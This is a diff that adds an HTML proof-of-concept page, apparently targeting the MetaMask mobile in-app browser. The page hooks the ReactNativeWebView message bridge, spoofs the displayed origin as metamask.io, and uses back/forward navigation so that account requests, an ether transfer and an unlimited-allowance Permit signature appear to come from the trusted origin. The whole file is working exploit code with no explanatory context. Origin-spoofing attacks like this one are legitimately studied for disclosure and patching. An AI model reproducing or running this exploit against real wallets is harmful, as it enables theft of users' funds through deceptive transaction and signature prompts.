@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MM rebind PoC</title>
+<style>
+ body{font-family:-apple-system,sans-serif;margin:0;padding:14px;background:#0b0b0f;color:#e7e7e7}
+ button{display:block;width:100%;padding:14px;margin:8px 0;border:0;border-radius:8px;color:#fff;font-size:15px}
+ #leak{background:#2e7d32}#run{background:#2d6cdf}#tx{background:#a3372b}
+ input{width:100%;padding:10px;border-radius:8px;border:1px solid #333;background:#16161c;color:#eee;margin:6px 0}
+ #log{white-space:pre-wrap;background:#000;color:#39ff14;padding:10px;border-radius:8px;font-size:11px;height:320px;overflow:auto;margin-top:10px}
+</style></head>
+<body>
+<button id="leak">STEP 0: connect (read address)</button>
+<button id="run">spoof connect</button>
+<button id="tx">TX SPOOF</button>
+<button id="sig" style="background:#7b4fa3">SIG SPOOF</button>
+<div id="log"></div>
+<script>
+var SPOOF = "https://metamask.io";
+var TO    = "0x000000000000000000000000000000000000dEaD";
+var VAL   = "0x" + BigInt(1e15).toString(16);
+
+function ts(){return new Date().toISOString().slice(11,23);}
+function log(m){var e=document.getElementById("log");e.textContent+="["+ts()+"] "+m+"\n";e.scrollTop=e.scrollHeight;}
+function rnpost(p){ try{ window.ReactNativeWebView.postMessage(JSON.stringify(p)); }catch(e){ log("rnpost err "+e.message); } }
+var leaked=null, didSpoofConnect=false;
+
+function rawReq(id, method, params){
+  log("→ raw "+method+" as "+SPOOF);
+  rnpost({ name:"metamask-provider", origin:SPOOF, data:{ jsonrpc:"2.0", id:id, method:method, params:params||[] } });
+}
+function victimAddr(){ return leaked; }
+
+(function(){
+  try{
+    if(!window.ReactNativeWebView || window.__mmHook){ return; } window.__mmHook=1;
+    var real = window.ReactNativeWebView.postMessage.bind(window.ReactNativeWebView);
+    window.ReactNativeWebView.postMessage = function(msg){
+      try{
+        var o = JSON.parse(msg);
+        if(o && o.type === "DOCUMENT_URL_FOR_URL_BAR" && o.payload){
+          o.payload.url = SPOOF + "/";
+          var r = real(JSON.stringify(o));
+          if(!didSpoofConnect){ didSpoofConnect=true; setTimeout(afterRebind, 250); }
+          return r;
+        }
+      }catch(e){}
+      return real(msg);
+    };
+  }catch(e){ log("proxy err "+e.message); }
+})();
+
+function resetToOrigin(){
+  setTimeout(function(){ var u=new URL(location.href); u.searchParams.delete("p"); u.searchParams.set("done","1"); location.replace(u.toString()); }, 1);
+}
+
+function afterRebind(){
+  var act = sessionStorage.getItem("act");
+  resetToOrigin();
+  if(act === "tx"){
+    var from = victimAddr();
+    if(!from){ log("no address — run STEP 0 first"); return; }
+    rawReq(2, "eth_sendTransaction", [{ from:from, to:TO, value:VAL, gas:"0x5208" }]);
+  } else if(act === "sig"){
+    var owner = victimAddr();
+    if(!owner){ log("no address — run STEP 0 first"); return; }
+    var typed = JSON.stringify({
+      types:{ EIP712Domain:[{name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],
+              Permit:[{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}] },
+      primaryType:"Permit", domain:{name:"Token",version:"1",chainId:1,verifyingContract:"0x0000000000000000000000000000000000000001"},
+      message:{owner:owner,spender:TO,value:"0xffffffffffffffffffffffffffffffffffffffff",nonce:0,deadline:"0xffffffffff"} });
+    rawReq(3, "eth_signTypedData_v4", [owner, typed]);
+  } else {
+    var n=0;(function t(){ if(n>=6)return; rawReq(100+n,"eth_requestAccounts",[]); n++; setTimeout(t,350); })();
+  }
+}
+
+function rebindThen(act){
+  sessionStorage.setItem("act", act);
+  sessionStorage.setItem("mm_step","goback");
+  var u = new URL(location.href); u.searchParams.set("p","2"); location.assign(u.toString());
+}
+
+(async function(){
+  var t=0; while(!window.ethereum && t<40){ await new Promise(r=>setTimeout(r,300)); t++; }
+  leaked = sessionStorage.getItem("addr") || null; if(leaked) log("address: "+leaked);
+  try{ window.ethereum && window.ethereum.on("accountsChanged", function(a){ if(a&&a[0]){ leaked=a[0]; sessionStorage.setItem("addr",leaked); log("address: "+leaked); } }); }catch(e){}
+})();
+
+document.getElementById("leak").onclick = function(){
+  window.ethereum.request({method:"eth_requestAccounts"})
+    .then(function(a){ leaked=a&&a[0]; sessionStorage.setItem("addr",leaked); log("address: "+leaked); })
+    .catch(function(e){ log("err "+(e&&e.message)); });
+};
+document.getElementById("run").onclick = function(){ rebindThen("connect"); };
+document.getElementById("tx").onclick  = function(){ if(!victimAddr()){ log("run STEP 0 first"); return; } rebindThen("tx"); };
+document.getElementById("sig").onclick = function(){ if(!victimAddr()){ log("run STEP 0 first"); return; } rebindThen("sig"); };
+
+var phase = new URL(location.href).searchParams.get("p");
+if(phase==="2"){
+  if(sessionStorage.getItem("mm_step")==="goback"){ sessionStorage.setItem("mm_step","came_back"); setTimeout(function(){ history.back(); }, 700); }
+}else if(sessionStorage.getItem("mm_step")==="came_back"){
+  sessionStorage.removeItem("mm_step");
+  log("back/forward -> "+(sessionStorage.getItem("act")||"connect")+" as "+SPOOF);
+  window.addEventListener("load", function(){ setTimeout(function(){ if(!didSpoofConnect){ didSpoofConnect=true; afterRebind(); } }, 1500); });
+}
+</script>
+</body></html>
